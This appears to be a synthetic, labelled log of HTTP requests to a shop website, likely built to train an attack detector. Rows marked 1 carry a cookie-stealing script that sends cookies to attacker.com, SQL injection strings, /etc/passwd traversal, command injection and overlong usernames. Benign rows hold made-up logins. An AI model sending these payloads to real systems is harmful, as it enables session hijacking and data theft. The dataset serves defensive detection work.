+07:25:41.5,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:25:43.7,203.162.4.191,POST,/auth/register,"{'csrf_token': 'Img0Wn5tjlXRL5oF1Lo3yGTSbjQpddv7KxSzIAGsA1'.g5z3d0Nr.6_VMvROe0AgRAAWxF-e0PSBsKP15, 'username': 'newuser38', 'email': 'a94@b.com', 'password': 'nPDSujBzR3*h', 'submit': 'Register'}",0
+07:25:45.6,10.0.0.28,POST,/auth/login,"{'csrf_token': 'ImMwkRy3irCb2usI5d7cod2lYlk1cVC9g0Qi9PhY97'.6E3OMlGd.kMNN2JZ1KgpDBa8laUm557UAY4L9, 'username': 'user87', 'password': 'yslGRuh5HXTv', 'submit': 'Log in'}",0
+07:25:47.5,192.168.1.141,GET,/order/myorders,,0
+07:25:49.6,192.168.1.104,GET,/category/Iphone,,0
+07:25:51.1,192.168.1.197,GET,/order/cart,,0
+07:25:53.7,192.168.1.167,GET,/auth/logout,,0
+07:25:54.8,203.162.4.190,GET,/order/cart,,0
+07:25:57.6,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:25:59.4,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:26:01.4,192.168.1.169,POST,/auth/login,"{'csrf_token': 'ImQV2JbOXoHAOuzeq61lziAnLnhyPgAtz5BFvPYWxe'.nDbe2qYf.oLOFDUe1pPHsByl97LyEAG4_chAO, 'username': 'user81', 'password': 'P@POx(Gz#X^3', 'submit': 'Log in'}",0
+07:26:03.7,203.162.4.191,POST,/auth/login,"{'csrf_token': 'ImoEdwpqs9D1hHTVvNXlJqJjGMO5GQUEf90aBo5JXc'.QwIUccPF.lVawRtqDbj4yn9aJcunitkmPsNMn, 'username': 'user76', 'password': 'h9ZUDWZRwlH9', 'submit': 'Log in'}",0
+07:26:05.0,10.0.0.82,GET,/auth/logout,,0
+07:26:07.1,192.168.1.144,GET,/auth/register,,0
+07:26:09.2,192.168.1.50,GET,/order/myorders,,0
+07:26:11.2,192.168.1.165,POST,/search,{'query': 'iphone 15 pro max'},0
+07:26:13.5,203.162.4.191,GET,/auth/login,,0
+07:26:15.6,192.168.1.22,GET,/product/1,,0
+07:26:17.5,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:26:19.2,192.168.1.50,GET,/product/1,,0
+07:26:21.5,192.168.1.56,GET,/product/2,,0
+07:26:22.7,10.0.0.82,GET,/category/Iphone,,0
+07:26:24.8,10.0.0.176,GET,/auth/register,,0
+07:26:27.5,192.168.1.151,POST,/auth/register,"{'csrf_token': 'ImvkxTVdyLuKbiJEG6pNOKCxYMQWkrFPj0J0M7ayP7'.vEuKpPDf.tCMF3rNGCqS1PujmR8KZfHJrc--0, 'username': 'newuser93', 'email': 'a87@b.com', 'password': 'x03)!u%Mcnx!', 'submit': 'Register'}",0
+07:26:29.1,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:26:30.7,192.168.1.175,POST,/search,{'query': 'iphone 15 pro max'},0
+07:26:32.9,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:26:35.3,10.0.0.195,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:26:37.2,192.168.1.46,GET,/auth/login,,0
+07:26:39.0,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:26:41.5,203.162.4.191,POST,/auth/register,"{'csrf_token': 'ImP4bjmeGi7c5azmeaCndqdF9hBjdvdf7s5QAWme0Z'.35FDqh2I.0pI3om8D0wAvZCwXlYnPEJ38UNLW, 'username': 'newuser11', 'email': 'a19@b.com', 'password': '^*msvabDWxsA', 'submit': 'Register'}",0
+07:26:43.7,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:26:45.5,203.162.4.190,GET,/product/1,,0
+07:26:46.8,10.0.0.195,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:26:49.0,192.168.1.167,GET,/,,0
+07:26:50.8,10.0.0.146,POST,/auth/login,"{'csrf_token': 'ImJPcij9dDcJgNxqNBzblJhaK0CofuXvGPjEwPGO6P'.RelkykNB.xdwG3WOQsS3ss5XkFr58OCxu3PpG, 'username': 'user98', 'password': 'TWxKEXDT9*OS', 'submit': 'Log in'}",0
+07:26:53.4,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:26:55.0,192.168.1.175,GET,/auth/register,,0
+07:26:56.9,192.168.1.197,POST,/auth/register,"{'csrf_token': 'ImB4Yi6SnTXGPWwvIvPb6lWxp9r1z1xqrodLNND88t'.JAbbYD4I.GuXWqbuPHr5sA5R4v4ivkxawwP4k, 'username': 'newuser45', 'email': 'a80@b.com', 'password': 'tPWBfnV@1R50', 'submit': 'Register'}",0
+07:26:59.3,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:27:01.6,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:27:03.2,10.0.0.106,GET,/product/1,,0
+07:27:04.9,192.168.1.185,GET,/product/1,,0
+07:27:07.3,10.0.0.79,POST,/auth/register,"{'csrf_token': 'ImQmf84g0A3ayX6H0iHzRr28I6abhR6u0fMVDuTYrT'.H8NgXFzZ.-V9GXYBnW-ih5KSF7sWQUcsAXwAx, 'username': 'newuser99', 'email': 'a98@b.com', 'password': 'OZ0WWMHXBZkA', 'submit': 'Register'}",0
+07:27:09.7,192.168.1.169,GET,/product/1,,0
+07:27:10.9,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:27:13.0,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:27:15.2,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:27:17.4,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:27:19.4,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:27:21.0,10.0.0.79,GET,/product/2,,0
+07:27:23.4,192.168.1.162,GET,/auth/register,,0
+07:27:25.4,192.168.1.175,POST,/auth/register,"{'csrf_token': 'ImxSXn3GbaZptlJHO1gbTAOWAYfxnfWBQ5puTE4Lh0'.yqx5l7Ut.StuWYEM241_ZPKam1LnzJU6-OQsF, 'username': 'newuser43', 'email': 'a16@b.com', 'password': 'ID4pybS5s!gQ', 'submit': 'Register'}",0
+07:27:26.9,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:27:29.6,10.0.0.15,POST,/auth/register,"{'csrf_token': 'ImNDi65eSv0ezmesEfkKCHjv9yxLy5IYwD7IvShe1Q'.gQ95ZiAo.2VtQkgf-4noMIDqkxMMntpGOZuP-, 'username': 'newuser5', 'email': 'a91@b.com', 'password': 'e)xzqrs@dkG@', 'submit': 'Register'}",0
+07:27:30.8,192.168.1.162,GET,/,,0
+07:27:33.7,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:27:35.2,127.0.0.1,GET,/auth/login,,0
+07:27:37.1,192.168.1.18,POST,/auth/login,"{'csrf_token': 'ImoXEE1uWIuc5SDjRU4T4MxwHsFfnRus9i5xnvDSsQ'.cOzGsiLm.UT4cLquDJqwc_oZQ5CUIomgYfZAE, 'username': 'user51', 'password': 'L2$4pYipRdkF', 'submit': 'Log in'}",0
+07:27:39.0,10.0.0.79,POST,/auth/register,"{'csrf_token': 'Imi4GSoi1AlCjraUdZt8lSLE9oBQrqP1283ujN0c10'.oMXg5OpX.F5T2r7l8NYFI40Yz_qtfOanhIZNi, 'username': 'newuser88', 'email': 'a37@b.com', 'password': 'rX!dX)mj*scU', 'submit': 'Register'}",0
+07:27:40.8,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:27:43.6,192.168.1.50,GET,/category/Iphone,,0
+07:27:45.3,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:27:47.0,192.168.1.197,GET,/product/1,,0
+07:27:49.7,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:27:51.3,192.168.1.22,GET,/order/myorders,,0
+07:27:53.4,10.0.0.28,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:27:55.7,203.162.4.191,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:27:57.6,192.168.1.197,GET,/product/2,,0
+07:27:59.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:28:01.2,192.168.1.185,GET,/auth/logout,,0
+07:28:03.0,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:28:05.3,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:28:06.9,192.168.1.22,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:28:09.7,192.168.1.169,POST,/search,{'query': 'iphone 15 pro max'},0
+07:28:11.0,192.168.1.104,GET,/auth/register,,0
+07:28:13.7,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:28:15.4,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:28:17.7,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:28:19.6,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:28:21.1,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:28:23.0,10.0.0.15,POST,/search,{'query': 'iphone 15 pro max'},0
+07:28:25.6,192.168.1.104,GET,/product/2,,0
+07:28:27.6,10.0.0.146,GET,/order/myorders,,0
+07:28:29.7,203.162.4.191,GET,/product/1,,0
+07:28:31.2,192.168.1.46,POST,/auth/login,"{'csrf_token': 'ImArTTXbN8aRUTiZ4x4LKU39cYLHzDgnQbaD5YRvec'.wTEBK0Ao.zjj0_h0TMnlswh7mL8zB5AB4N8Vp, 'username': 'user57', 'password': 'W!qi&36P&far', 'submit': 'Log in'}",0
+07:28:33.0,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:28:34.8,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:28:37.4,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:28:38.8,10.0.0.15,GET,/order/cart,,0
+07:28:41.3,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:28:43.5,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:28:45.2,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:28:47.0,10.0.0.67,POST,/auth/login,"{'csrf_token': 'Im9pC1yuSlMuVzIXw0Wapj5t58FqloxWRmfAR1Gc6L'.7fsMJZXP.4JTMkasVZUphnnYXwO_EP4AwlB9O, 'username': 'user95', 'password': '!nBpU4652Lqf', 'submit': 'Log in'}",0
+07:28:48.8,192.168.1.12,POST,/auth/login,"{'csrf_token': 'Im5xZmkossNpweYpOoWGp0SJoAOs4OjcM0BPwXOH9h'.Gsj9qPmm.i69q2MiIK86qhFRzC6YK11gtJL8S, 'username': 'user75', 'password': '^PqPsYB^To#q', 'submit': 'Log in'}",0
+07:28:51.7,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:28:53.6,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:28:55.5,192.168.1.185,GET,/auth/logout,,0
+07:28:57.4,10.0.0.82,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:28:58.9,192.168.1.141,POST,/search,{'query': 'iphone 15 pro max'},0
+07:29:01.4,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:29:03.4,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:29:05.7,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:29:07.1,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:29:09.1,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:29:11.1,10.0.0.176,GET,/auth/register,,0
+07:29:13.0,10.0.0.195,GET,/product/1,,0
+07:29:15.5,192.168.1.55,POST,/search,{'query': 'iphone 15 pro max'},0
+07:29:17.7,127.0.0.1,POST,/auth/register,"{'csrf_token': 'ImeNp7vYBAt18XcTUsJ9CRGvxhYeZOZ9bBOoVR0cCT'.2MZsu8e8.iwX4JXAPNpb_LJ4FMm30-5y9TFXM, 'username': 'newuser48', 'email': 'a50@b.com', 'password': 'ikvQccb9(Mww', 'submit': 'Register'}",0
+07:29:19.3,192.168.1.12,GET,/order/cart,,0
+07:29:20.9,192.168.1.162,POST,/auth/register,"{'csrf_token': 'ImcBhEV1VVpJmTss5eWzkYdpZqagNuWQbUGEgq7srj'.ZuI9cJR2.-E2bXD-RK5nn4y2_46tsYGSdzbmt, 'username': 'newuser99', 'email': 'a37@b.com', 'password': '!vFP8HH%IXe&', 'submit': 'Register'}",0
+07:29:23.5,10.0.0.28,POST,/search,{'query': 'iphone 15 pro max'},0
+07:29:25.4,10.0.0.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:29:27.1,192.168.1.144,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:29:29.0,192.168.1.55,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:29:30.9,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:29:32.9,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:29:35.6,192.168.1.197,GET,/order/myorders,,0
+07:29:37.5,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:29:39.6,10.0.0.67,POST,/auth/register,"{'csrf_token': 'Imy2A6yQZjdxs34yecp7AZFXiI2uQgVYutmQ3nsOUn'.9KBigIfx._LxZZcThTPsXVTPElTGBJWkSgEhl, 'username': 'newuser46', 'email': 'a62@b.com', 'password': 'bG6RUW4Hdjq&', 'submit': 'Register'}",0
+07:29:41.5,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:29:43.4,192.168.1.175,GET,/auth/logout,,0
+07:29:45.3,203.162.4.190,POST,/auth/register,"{'csrf_token': 'Im6YGquFJrdnnVNB4QjPeWu4Z7EovE8KRrMbzOdjxa'.ED4JohLx.uOudWm_yl8VrlymDXsRT0rq6cQaf, 'username': 'newuser80', 'email': 'a87@b.com', 'password': 'xhX&ISsHFFD^', 'submit': 'Register'}",0
+07:29:47.3,192.168.1.12,POST,/auth/login,"{'csrf_token': 'ImSVC0H79Airu9Sq8JKuRxMvqCeerYq0FeXvePAXBy'.4VaoZLHQ.cFFXxKeCFxGZy-O2tvy3yWsjkLvw, 'username': 'user18', 'password': 'NYMXh*&FipO1', 'submit': 'Log in'}",0
+07:29:49.4,10.0.0.79,POST,/auth/register,"{'csrf_token': 'ImBtQ1dyDEJU8aJEdpHIFg4yknbKMOzDlP5npcdKcw'.FaSgkOPs.46gf0rtaIVE4ZFWZ0O3PZiWGQmcF, 'username': 'newuser27', 'email': 'a55@b.com', 'password': '#N$s$)aaj)XO', 'submit': 'Register'}",0
+07:29:50.9,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:29:53.6,192.168.1.22,GET,/auth/login,,0
+07:29:55.5,192.168.1.169,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:29:57.2,192.168.1.185,GET,/auth/register,,0
+07:29:59.2,192.168.1.175,POST,/auth/register,"{'csrf_token': 'Imr3uJEPufmEytcRxq09fzmnz0ECBXZvKKeB0rGRR5'.J8pBHd9D.IPf97ZMCHPdH9XWymoRJ6mezCdN1, 'username': 'newuser100', 'email': 'a22@b.com', 'password': '$(pGJi%df49m', 'submit': 'Register'}",0
+07:30:01.4,192.168.1.104,GET,/order/myorders,,0
+07:30:03.4,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:30:04.9,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:30:07.1,192.168.1.162,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:30:09.6,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:30:10.8,192.168.1.185,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:30:13.0,10.0.0.79,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:30:14.8,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:30:17.4,192.168.1.28,GET,/auth/login,,0
+07:30:19.6,10.0.0.15,POST,/auth/login,"{'csrf_token': 'ImQ0hk49v1ljkzIM9IGzlbcAFX1KZbdM6m7FNg6223'.FpTioKYM.tmtcVCSkuoAy3YAzGu0z1epPogxn, 'username': 'user72', 'password': 'iG$UAh%WWSqe', 'submit': 'Log in'}",0
+07:30:21.0,192.168.1.197,GET,/order/myorders,,0
+07:30:23.1,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:30:25.4,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:30:27.3,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:30:28.9,192.168.1.46,POST,/search,{'query': 'iphone 15 pro max'},0
+07:30:31.7,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:30:33.3,192.168.1.12,POST,/search,{'query': 'iphone 15 pro max'},0
+07:30:35.2,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:30:36.9,10.0.0.15,GET,/auth/login,,0
+07:30:39.2,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:30:41.5,192.168.1.28,POST,/auth/register,"{'csrf_token': 'ImhxkkszQltB298qW2pKwaR54WEXfZkpt4klWmNT6J'.7o1BUmEt.LtY-eXPJEhNiPqCSJLN9wEChi7V8, 'username': 'newuser50', 'email': 'a48@b.com', 'password': 'per3Jea3h@6o', 'submit': 'Register'}",0
+07:30:43.3,192.168.1.167,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:30:44.8,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:30:47.1,192.168.1.141,GET,/auth/logout,,0
+07:30:49.2,10.0.0.82,GET,/order/cart,,0
+07:30:51.7,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:30:53.0,192.168.1.167,GET,/order/myorders,,0
+07:30:55.7,192.168.1.141,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:30:57.1,192.168.1.55,POST,/auth/register,"{'csrf_token': 'Imh6i7rm6yJxGBYpjaFu5JqEcpKoRdyxnL2y8HP5KI'.2VTjrRoJ.h2jYY33YTBLpb8GYAgSa5SDGDt5Z, 'username': 'newuser29', 'email': 'a47@b.com', 'password': 'dZchShEpHY&H', 'submit': 'Register'}",0
+07:30:59.2,192.168.1.185,POST,/search,{'query': 'iphone 15 pro max'},0
+07:31:00.8,192.168.1.50,GET,/product/2,,0
+07:31:03.5,192.168.1.162,GET,/category/Iphone,,0
+07:31:05.6,192.168.1.197,GET,/auth/logout,,0
+07:31:07.2,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:31:08.9,10.0.0.79,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:31:11.0,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:31:13.5,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:31:15.0,10.0.0.15,POST,/auth/login,"{'csrf_token': 'Imo44qSBoBCBko3m3lS9B3igO6pmkcmKiGVJapUPdk'.IOROpSMV.V9kBK6aheU6zp738VPa3Dfe4AIXZ, 'username': 'user54', 'password': 'hrRSmunIYK)7', 'submit': 'Log in'}",0
+07:31:17.6,192.168.1.12,POST,/search,{'query': 'iphone 15 pro max'},0
+07:31:19.7,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:31:21.7,10.0.0.67,POST,/auth/login,"{'csrf_token': 'ImUnAPCXtvG0nNGlqHqGacbUiTZDN5jUnfwVXwq1fU'.HIfLwFnQ.tT8PYqzRapO2m-y0PcT0oMpHTMaW, 'username': 'user65', 'password': 'jzp@R*nYVi&*', 'submit': 'Log in'}",0
+07:31:23.3,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:31:25.0,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:31:27.3,192.168.1.197,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:31:29.5,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:31:31.5,192.168.1.12,GET,/,,0
+07:31:33.3,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:31:35.6,192.168.1.46,GET,/product/2,,0
+07:31:37.0,192.168.1.185,GET,/product/1,,0
+07:31:38.9,127.0.0.1,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:31:40.8,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:31:43.2,10.0.0.66,POST,/search,{'query': 'iphone 15 pro max'},0
+07:31:45.6,192.168.1.169,POST,/search,{'query': 'iphone 15 pro max'},0
+07:31:47.4,192.168.1.55,GET,/order/myorders,,0
+07:31:49.6,192.168.1.28,GET,/category/Iphone,,0
+07:31:51.7,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:31:53.2,192.168.1.22,GET,/product/1,,0
+07:31:55.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:31:56.9,10.0.0.67,GET,/product/1,,0
+07:31:59.2,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:32:00.9,10.0.0.15,GET,/product/2,,0
+07:32:03.0,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:32:05.3,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
